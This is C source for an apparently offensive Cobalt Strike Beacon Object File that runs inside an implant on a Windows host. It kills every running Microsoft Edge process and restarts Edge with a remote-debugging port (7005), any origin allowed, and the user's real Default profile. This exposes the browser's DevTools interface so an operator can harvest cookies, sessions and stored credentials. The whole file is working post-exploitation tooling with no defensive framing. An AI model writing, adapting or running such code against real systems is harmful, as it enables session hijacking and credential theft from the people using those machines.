#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

// bof imports
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrcmpiW(LPCWSTR, LPCWSTR);

// helpers
static void zero_memory(void *buffer, SIZE_T size) {
   unsigned char *cursor = (unsigned char *)buffer;

   while (size--) {
      *cursor++ = 0;
   }
}

// launch process wrapper
static BOOL launch_edge(LPCWSTR edgePath, WCHAR *cmdLine, DWORD *pid, DWORD *err) {
   STARTUPINFOW si;
   PROCESS_INFORMATION pi;

   zero_memory(&si, sizeof(si));
   zero_memory(&pi, sizeof(pi));

   si.cb = sizeof(si);

   BeaconPrintf(CALLBACK_OUTPUT, "\t> calling \"CreateProcessW\"\n");

   if (!KERNEL32$CreateProcessW(edgePath, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
      *err = KERNEL32$GetLastError();
      return FALSE;
   }

   *pid = pi.dwProcessId;
   *err = 0;

   KERNEL32$CloseHandle(pi.hThread);
   KERNEL32$CloseHandle(pi.hProcess);

   return TRUE;
}

void go(char *args, int length) {
   HANDLE snapshot;
   PROCESSENTRY32W pe;
   WCHAR cmdLine[1024];
   DWORD pid = 0, err_x64 = 0, err_x86 = 0, expanded = 0;;
   BOOL launched = FALSE;

   LPCWSTR edgePath64 = L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
   LPCWSTR edgePath86 = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";

   int killed = 0;

   (void)args;
   (void)length;

   // kill existing msedge.exe processes
   zero_memory(&pe, sizeof(pe));
   pe.dwSize = sizeof(PROCESSENTRY32W);
   snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

   if (snapshot == INVALID_HANDLE_VALUE) {
      BeaconPrintf(CALLBACK_ERROR, "\n[!] CreateToolhelp32Snapshot failed. GLE=%lu\n", KERNEL32$GetLastError());
      return;
   }

   if (!KERNEL32$Process32FirstW(snapshot, &pe)) {
      BeaconPrintf(CALLBACK_ERROR, "\n[!] Process32FirstW failed. GLE=%lu\n", KERNEL32$GetLastError());

      KERNEL32$CloseHandle(snapshot);
      return;
   }

   do {
      if (KERNEL32$lstrcmpiW(pe.szExeFile, L"msedge.exe") == 0) {
         HANDLE proc = KERNEL32$OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);

         if (proc) {
            if (KERNEL32$TerminateProcess(proc, 1)) {
               KERNEL32$WaitForSingleObject(proc, 2000);
               killed++;
            }

            KERNEL32$CloseHandle(proc);
         }
      }

      pe.dwSize = sizeof(PROCESSENTRY32W);

   } while (KERNEL32$Process32NextW(snapshot, &pe));

   KERNEL32$CloseHandle(snapshot);
   BeaconPrintf(CALLBACK_OUTPUT, "\t> terminated %d msedge.exe process(es)\n", killed);

   // try x64
   BeaconPrintf(CALLBACK_OUTPUT, "\t> trying x64 path\n");
   zero_memory(cmdLine, sizeof(cmdLine));

   expanded = KERNEL32$ExpandEnvironmentStringsW(
       L"\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\" "
       L"--remote-debugging-port=7005 " //hardcoded port 7005
       L"--remote-allow-origins=\"*\" "
       L"--user-data-dir=\"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\" "
       L"--profile-directory=\"Default\"",
       cmdLine,
       1024);

   if (expanded == 0 || expanded >= 1024) {
      BeaconPrintf(CALLBACK_ERROR, "\n[!] ExpandEnvironmentStringsW failed for x64 cmdLine. GLE=%lu expanded=%lu\n", KERNEL32$GetLastError(), expanded);
      return;
   }

   launched = launch_edge(edgePath64, cmdLine, &pid, &err_x64);

   // try x86(32)
   if (!launched) {
      BeaconPrintf(CALLBACK_OUTPUT, "\t> x64 path failed: GLE=%lu\n\n", err_x64);
      BeaconPrintf(CALLBACK_OUTPUT, "\t> trying x86 path\n");

      zero_memory(cmdLine, sizeof(cmdLine));
      expanded = KERNEL32$ExpandEnvironmentStringsW(
          L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" "
          L"--remote-debugging-port=7005 " // hardcoded port 7005
          L"--remote-allow-origins=\"*\" "
          L"--user-data-dir=\"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\" "
          L"--profile-directory=\"Default\"",
          cmdLine,
          1024);

      if (expanded == 0 || expanded >= 1024) {
         BeaconPrintf(CALLBACK_ERROR, "\n[!] ExpandEnvironmentStringsW failed for x86 cmdLine. GLE=%lu expanded=%lu\n", KERNEL32$GetLastError(), expanded);
         return;
      }

      launched = launch_edge(edgePath86, cmdLine, &pid, &err_x86);
   }

   // end
   if (!launched) {
      BeaconPrintf(CALLBACK_ERROR, "\n[!] CreateProcessW failed for both paths. x64 GLE=%lu, x86 GLE=%lu\n", err_x64, err_x86);
      return;
   }

   BeaconPrintf(CALLBACK_OUTPUT, "\t> DONE: msedge.exe PID %lu", pid);
}
